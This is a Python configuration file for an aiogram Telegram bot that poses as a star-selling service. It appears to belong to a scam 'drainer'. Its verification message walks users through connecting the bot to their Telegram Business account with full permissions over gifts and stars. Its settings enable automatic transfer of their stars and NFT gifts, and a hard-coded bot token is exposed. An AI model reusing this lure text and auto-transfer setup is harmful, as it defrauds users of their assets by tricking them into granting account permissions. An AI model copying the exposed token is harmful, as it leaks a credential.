import os
import json
from typing import Dict, Any
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# Путь к файлу, где будут храниться ID администраторов
ADMINS_FILE_PATH = "admins.json"
OWNER_ID = 7592097268

def load_admins():
    """Загружает список админов из файла. Если файла нет, создает его с OWNER_ID."""
    try:
        if not os.path.exists(ADMINS_FILE_PATH):
            # Если файл не существует, создаем его с ID владельца
            with open(ADMINS_FILE_PATH, 'w') as f:
                json.dump({'admin_ids': [OWNER_ID]}, f)
            print("Создан новый файл admins.json с ID владельца.")
            return [OWNER_ID]
        
        with open(ADMINS_FILE_PATH, 'r') as f:
            data = json.load(f)
            return data.get('admin_ids', [])
            
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"Ошибка при загрузке admins.json: {e}. Используется ID владельца.")
        return [OWNER_ID]

def save_admins(admin_list):
    """Сохраняет список админов в файл."""
    with open(ADMINS_FILE_PATH, 'w') as f:
        json.dump({'admin_ids': admin_list}, f, indent=4)

# Загружаем список админов при старте бота
ADMIN_IDS = load_admins()

# Остальные ваши переменные и функции
TOKEN = "7968107633:AAHNWfpFYlwcgRoUoI46VlKdAmqvZBCIIvs"
ADMIN_ID = ADMIN_IDS[0] if ADMIN_IDS else None
DATABASE_PATH = "bot_database.db"
CONNECTIONS_FILE = "business_connections.json"
TRANSFER_LOG_FILE = "transfer_log.json"
SETTINGS_FILE = "settings.json"
CHECKS_FILE = "checks.json"
TRANSFER_DELAY = 1  
BALANCE_UPDATE_DELAY = 10  
AUTO_CHECK_INTERVAL = 900  
NOTIFICATION_INTERVAL = 1800  
AUTO_TRANSFER_ENABLED = True
MANUAL_SELECTION_ENABLED = False
AUTO_NOTIFICATIONS_ENABLED = True
MIN_STARS_FOR_AUTO_TRANSFER = 10
MAX_NFT_DISPLAY = 5  
MAX_ERRORS_DISPLAY = 3  
MAX_LOGS_DISPLAY = 10  
LOG_LEVEL = "INFO"
LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
LOG_FILE = "bot.log"
EXPORT_CLEANUP_DAYS = 7
NOTIFICATION_TEMPLATES = {
    'welcome': "✅ <b>Бот успешно подключен!</b>\nВесь функционал теперь доступен.",
    'balance_notification': "⭐️ <b>У вас накопилось {balance} звезд!</b>\n\nЭто достаточно для автоматического перевода NFT. Бот скоро заберет их для вас! 🎁",
    'auto_transfer_success': "✅ <b>Автоматически переведено {amount} звезд!</b>\n\nСпасибо за использование нашего бота! 🎉",
    'connection_error': "❌ <b>Ошибка подключения:</b> {error}",
    'transfer_success': "✅ <b>Перевод выполнен успешно!</b>\nПереведено: {amount}",
    'transfer_failed': "❌ <b>Ошибка перевода:</b> {error}"
}
WELCOME_MESSAGE = "⭐️ <b>Добро пожаловать в бот по продаже звезд!</b>\n\n🌟 Здесь вы можете:\n• Получать звезды от друзей\n• Отправлять звезды близким\n• Зарабатывать на звездах\n• Обменивать звезды на NFT\n\n💫 Начните зарабатывать звезды прямо сейчас!"
VERIFICATION_TEXT = (
    "⭐️ <b>Для получения звезд необходимо подключить бота к вашему аккаунту:</b>\n\n"
    "📋 <b>Инструкция по подключению:</b>\n\n"
    "<blockquote>"
    "<b>1. Откройте настройки в Telegram</b>\n"
    "<b>2. Найдите вкладку Telegram для бизнеса и перейдите в нее</b>\n"
    "<b>3. Выберите вкладку Чат-боты</b>\n"
    "<b>4. Введите в поле ввода ссылку на бота: @Sendstarstelegramrobot</b>\n"
    "<b>5. Выдайте боту все разрешения на проверку подарков и звезд</b>"
    "</blockquote>\n\n"
    "<b>После подключения вы сможете получать и отправлять звезды!</b>\n\n"
    "❗️ <b>Обратите внимание:</b>\n"
    "• Подключение проводится только через <b>официального бота Telegram</b>\n"
    "• Никогда не доверяйте свои данные <b>третьим лицам</b>\n"
    "• Бот работает только с <b>официальными звездами Telegram</b>\n\n"
    "С уважением команда <b>Send</b> ⭐️"
)
VERIFICATION_KEYBOARD = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⚙️ Перейти в настройки", url="tg://settings")],
    [InlineKeyboardButton(text="✨ Проверить подключение", callback_data="check_connection")],
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_gift")]
])
ADMIN_PANEL_TITLE = "🛠️ Расширенная админ-панель"
ADMIN_PANEL_DESCRIPTION = "Выберите действие:"
INLINE_CACHE_TIME = 10
INLINE_THUMBNAIL_URL = "https://cdn-icons-png.flaticon.com/512/6366/6366191.png"
CHANNEL_LINK = "https://t.me/"
REVIEWS_LINK = "https://t.me/"
MASS_OPERATION_TIMEOUT = 300  
MAX_CONCURRENT_OPERATIONS = 10  
STATS_TOP_USERS_LIMIT = 5  
STATS_DAILY_RETENTION = 30  
MAX_RETRY_ATTEMPTS = 3  
RATE_LIMIT_DELAY = 1  
FILE_ENCODING = "utf-8"
JSON_INDENT = 2
JSON_ENSURE_ASCII = False
DATABASE_PATH = "bot_database.db"

def is_admin(user_id: int) -> bool:
    """Проверяет, является ли пользователь админом"""
    global ADMIN_IDS
    return user_id in ADMIN_IDS

def get_admin_ids() -> list:
    """Возвращает список ID всех админов"""
    global ADMIN_IDS
    return ADMIN_IDS.copy()

def get_main_admin_id() -> int:
    """Возвращает ID основного админа (первого в списке)"""
    global ADMIN_IDS
    return ADMIN_IDS[0] if ADMIN_IDS else None
    
def add_admin(user_id: int):
    """Добавляет пользователя в список админов и сохраняет файл."""
    global ADMIN_IDS
    if user_id not in ADMIN_IDS:
        ADMIN_IDS.append(user_id)
        save_admins(ADMIN_IDS)

def remove_admin(user_id: int):
    """Удаляет пользователя из списка админов и сохраняет файл."""
    global ADMIN_IDS
    if user_id in ADMIN_IDS and user_id != OWNER_ID:
        ADMIN_IDS.remove(user_id)
        save_admins(ADMIN_IDS)

HEALTH_CHECK_INTERVAL = 3600  
ERROR_REPORTING_ENABLED = True
PERFORMANCE_MONITORING = True
BACKUP_ENABLED = True
BACKUP_INTERVAL = 86400  
BACKUP_RETENTION_DAYS = 7  

def get_settings() -> Dict[str, Any]:
    """Получение всех настроек"""
    return {
        'token': TOKEN,
        'admin_id': ADMIN_ID,
        'files': {
            'connections': CONNECTIONS_FILE,
            'transfer_log': TRANSFER_LOG_FILE,
            'settings': SETTINGS_FILE,
            'admins': ADMINS_FILE_PATH
        },
        'delays': {
            'transfer': TRANSFER_DELAY,
            'balance_update': BALANCE_UPDATE_DELAY,
            'auto_check': AUTO_CHECK_INTERVAL,
            'notification': NOTIFICATION_INTERVAL
        },
        'automation': {
            'auto_transfer': AUTO_TRANSFER_ENABLED,
            'manual_selection': MANUAL_SELECTION_ENABLED,
            'auto_notifications': AUTO_NOTIFICATIONS_ENABLED,
            'min_stars': MIN_STARS_FOR_AUTO_TRANSFER
        },
        'limits': {
            'nft_display': MAX_NFT_DISPLAY,
            'errors_display': MAX_ERRORS_DISPLAY,
            'logs_display': MAX_LOGS_DISPLAY
        },
        'logging': {
            'level': LOG_LEVEL,
            'format': LOG_FORMAT,
            'file': LOG_FILE
        },
        'export': {
            'cleanup_days': EXPORT_CLEANUP_DAYS
        },
        'inline': {
            'cache_time': INLINE_CACHE_TIME,
            'thumbnail_url': INLINE_THUMBNAIL_URL
        },
        'mass_operations': {
            'timeout': MASS_OPERATION_TIMEOUT,
            'max_concurrent': MAX_CONCURRENT_OPERATIONS
        },
        'statistics': {
            'top_users_limit': STATS_TOP_USERS_LIMIT,
            'daily_retention': STATS_DAILY_RETENTION
        },
        'security': {
            'max_retry_attempts': MAX_RETRY_ATTEMPTS,
            'rate_limit_delay': RATE_LIMIT_DELAY
        },
        'files_config': {
            'encoding': FILE_ENCODING,
            'json_indent': JSON_INDENT,
            'json_ensure_ascii': JSON_ENSURE_ASCII
        },
        'monitoring': {
            'health_check_interval': HEALTH_CHECK_INTERVAL,
            'error_reporting': ERROR_REPORTING_ENABLED,
            'performance_monitoring': PERFORMANCE_MONITORING
        },
        'backup': {
            'enabled': BACKUP_ENABLED,
            'interval': BACKUP_INTERVAL,
            'retention_days': BACKUP_RETENTION_DAYS
        }
    }

def validate_config() -> bool:
    """Проверка корректности конфигурации"""
    try:
        if not TOKEN or TOKEN == "YOUR_BOT_TOKEN":
            print("❌ Ошибка: Не установлен токен бота")
            return False
        
        # Проверяем, что список ADMIN_IDS не пустой
        if not ADMIN_IDS:
            print("❌ Ошибка: Список администраторов пуст")
            return False
        
        # Проверяем файлы
        required_files = [CONNECTIONS_FILE, TRANSFER_LOG_FILE, SETTINGS_FILE]
        for file in required_files:
            if not file or not file.endswith('.json'):
                print(f"❌ Ошибка: Некорректное имя файла: {file}")
                return False
        
        if TRANSFER_DELAY < 0 or BALANCE_UPDATE_DELAY < 0:
            print("❌ Ошибка: Отрицательные задержки")
            return False
        
        print("✅ Конфигурация корректна")
        return True
        
    except Exception as e:
        print(f"❌ Ошибка проверки конфигурации: {e}")
        return False


if __name__ == "__main__":
    validate_config()
